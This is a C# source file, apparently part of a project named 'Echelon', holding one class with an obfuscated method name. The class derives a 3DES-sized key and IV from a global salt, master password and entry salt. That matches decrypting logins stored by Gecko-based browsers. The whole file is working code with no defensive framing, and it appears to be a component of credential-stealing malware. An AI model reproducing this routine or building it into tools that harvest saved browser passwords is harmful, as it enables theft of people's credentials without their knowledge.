using System;
using System.Security.Cryptography;

namespace Echelon
{
	public class Gecko8
	{
		private byte[] _globalSalt
		{
			get;
		}

		private byte[] _masterPassword
		{
			get;
		}

		private byte[] _entrySalt
		{
			get;
		}

		public byte[] DataKey
		{
			get;
			private set;
		}

		public byte[] DataIV
		{
			get;
			private set;
		}

		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			_globalSalt = salt;
			_masterPassword = password;
			_entrySalt = entry;
		}

		public void го7па()
		{
			SHA1CryptoServiceProvider sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[_globalSalt.Length + _masterPassword.Length];
			Array.Copy(_globalSalt, 0, array, 0, _globalSalt.Length);
			Array.Copy(_masterPassword, 0, array, _globalSalt.Length, _masterPassword.Length);
			byte[] array2 = sHA1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + _entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(_entrySalt, 0, array3, array2.Length, _entrySalt.Length);
			byte[] key = sHA1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(_entrySalt, 0, array4, 0, _entrySalt.Length);
			for (int i = _entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + _entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(_entrySalt, 0, array5, array4.Length, _entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hMACSHA = new HMACSHA1(key))
			{
				array6 = hMACSHA.ComputeHash(array5);
				byte[] array7 = hMACSHA.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + _entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(_entrySalt, 0, array8, array7.Length, _entrySalt.Length);
				array9 = hMACSHA.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			DataKey = new byte[24];
			for (int j = 0; j < DataKey.Length; j++)
			{
				DataKey[j] = array10[j];
			}
			DataIV = new byte[8];
			int num = DataIV.Length - 1;
			for (int num2 = array10.Length - 1; num2 >= array10.Length - DataIV.Length; num2--)
			{
				DataIV[num] = array10[num2];
				num--;
			}
		}
	}
}
